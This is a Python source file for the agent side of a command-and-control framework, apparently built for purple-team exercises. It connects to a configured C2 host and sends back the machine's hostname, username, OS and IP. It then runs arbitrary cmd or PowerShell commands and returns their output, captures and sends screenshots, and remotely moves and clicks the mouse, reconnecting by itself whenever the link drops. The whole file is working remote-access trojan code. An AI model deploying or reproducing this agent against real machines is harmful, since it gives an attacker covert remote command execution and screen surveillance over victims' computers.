import os
import sys
import json
import socket
import time
from typing import Dict, Any, Optional
from dataclasses import dataclass, field
from uuid import uuid4
from datetime import datetime

from ..core.config import config
from ..core.logger import logger
from ..core.crypto import crypto
from ..core.types import AgentInfo, AgentStatus


class Agent:
    def __init__(self, server_host: Optional[str] = None, server_port: Optional[int] = None):
        self._host = server_host or config.get("c2.host", "127.0.0.1")
        self._tcp_port = server_port or config.get("c2.tcp_port", 5555)
        self._udp_port = config.get("c2.udp_port", 5556)
        self._password = config.get("c2.password", "purple-team-2024")
        self._encryption = config.get("agent.encryption", True)
        self._reconnect_interval = config.get("agent.reconnect_interval", 5)
        self._max_retries = config.get("agent.max_retries", 20)
        self._kill_date = config.get("agent.kill_date", "")

        self._info = AgentInfo(
            hostname=socket.gethostname(),
            username=os.environ.get("USERNAME", "unknown"),
            os=sys.platform,
        )
        self._sock: Optional[socket.socket] = None
        self._connected = False
        self._running = False
        self._modules: Dict[str, Any] = {}

    def _get_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _build_handshake(self) -> Dict[str, Any]:
        handshake = {
            "agent_id": self._info.agent_id,
            "hostname": self._info.hostname,
            "username": self._info.username,
            "os": self._info.os,
            "ip": self._get_ip(),
            "modules": list(self._modules.keys()),
            "timestamp": datetime.utcnow().isoformat(),
        }
        if self._encryption:
            return crypto.encrypt_payload(handshake)
        return handshake

    def connect(self) -> bool:
        import socket
        from datetime import datetime

        for attempt in range(self._max_retries):
            try:
                self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._sock.settimeout(10)
                self._sock.connect((self._host, self._tcp_port))
                handshake = self._build_handshake()
                self._sock.send(json.dumps(handshake).encode())
                self._connected = True
                logger.info(f"Connected to C2 at {self._host}:{self._tcp_port}")
                return True
            except Exception as e:
                logger.warning(f"Connection attempt {attempt+1} failed: {e}")
                if self._sock:
                    try:
                        self._sock.close()
                    except Exception:
                        pass
                time.sleep(self._reconnect_interval)
        return False

    def run(self) -> None:
        import socket
        from datetime import datetime

        self._running = True
        if not self.connect():
            logger.error("Failed to connect to C2")
            return

        buf = b""
        while self._running and self._connected:
            try:
                self._sock.settimeout(1)
                data = self._sock.recv(8192)
                if not data:
                    break
                buf += data
                buf = self._process(buf)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Connection lost: {e}")
                break

        self.disconnect()
        if self._running:
            logger.info("Reconnecting...")
            self.run()

    def _process(self, buf: bytes) -> bytes:
        text = buf.decode("utf-8", errors="replace")
        buf = b""

        for line in text.split("\n"):
            line = line.strip()
            if not line:
                continue

            if line.startswith("AUTH_CHALLENGE:"):
                self._handle_auth(line)
            elif line == "AUTH_OK":
                logger.info("Authenticated with C2")
            elif line == "AUTH_RETRY":
                logger.warning("Auth retry requested")
            elif line == "AUTH_FAIL":
                logger.error("Authentication failed")
                self._running = False
            elif line.startswith("[CMD]"):
                self._execute_command(line[5:])
            elif line == "[SCREENSHOT]":
                self._capture_screenshot()
            elif line == "[SSDESK]":
                self._capture_desktop()
            elif line.startswith("[MOUSE]"):
                self._move_mouse(line[7:])
            elif line == "[CLICK]":
                self._click_mouse()
            elif line == "[UNLOCK]":
                logger.info("Unlock command received")
            else:
                logger.debug(f"Unknown command: {line}")

        return buf

    def _handle_auth(self, challenge: str) -> None:
        import hashlib
        expected = hashlib.sha256(
            f"{challenge}:{self._password}".encode()
        ).hexdigest()
        try:
            self._sock.send(expected.encode())
        except Exception:
            pass

    def _execute_command(self, cmd: str) -> None:
        import subprocess

        try:
            if "|" in cmd:
                shell, command = cmd.split("|", 1)
                if shell == "powershell":
                    command = f"powershell -Command \"{command}\""
            else:
                shell, command = "cmd", cmd

            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )
            output = result.stdout + result.stderr
            self._send(f"[CMDOUT]{output}")
        except subprocess.TimeoutExpired:
            self._send("[CMDERR]Timeout 30s")
        except Exception as e:
            self._send(f"[CMDERR]{e}")

    def _capture_screenshot(self) -> None:
        try:
            from PIL import ImageGrab
            import io
            import struct

            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=60)
            data = buf.getvalue()
            prefix = b"[SSIMG]"
            length = struct.pack("!I", len(data))
            self._sock.send(prefix + length + data)
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")

    def _capture_desktop(self) -> None:
        self._capture_screenshot()

    def _move_mouse(self, coords: str) -> None:
        try:
            import ctypes
            x, y = coords.split(",")
            ctypes.windll.user32.SetCursorPos(int(x), int(y))
        except Exception:
            pass

    def _click_mouse(self) -> None:
        try:
            import ctypes
            ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)
            time.sleep(0.05)
            ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)
        except Exception:
            pass

    def _send(self, data: str) -> None:
        if self._sock and self._connected:
            try:
                self._sock.send(data.encode())
            except Exception:
                pass

    def send_info(self) -> None:
        info = f"[PCINFO]Hostname:{self._info.hostname}|Usuario:{self._info.username}|OS:{self._info.os}"
        self._send(info)

    def disconnect(self) -> None:
        self._connected = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    def register_module(self, name: str, module: Any) -> None:
        self._modules[name] = module
        logger.info(f"Module registered: {name}")

    def stop(self) -> None:
        self._running = False
        self.disconnect()


agent = Agent()
